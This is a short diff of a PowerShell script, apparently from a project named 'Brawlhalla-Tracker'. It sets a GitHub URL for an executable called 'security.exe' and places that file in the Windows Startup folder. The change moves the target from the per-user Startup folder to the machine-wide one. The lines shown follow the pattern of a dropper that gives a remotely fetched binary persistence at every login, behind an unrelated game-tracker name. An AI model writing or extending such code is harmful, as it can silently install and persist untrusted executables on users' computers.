@@ -1,4 +1,4 @@
-$startupFolder = [Environment]::GetFolderPath("Startup")
+$startupFolder = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 $url = "https://github.com/FCsab/Brawlhalla-Tracker/raw/refs/heads/main/security.exe"
 $outputPath = Join-Path $startupFolder "security.exe"
 
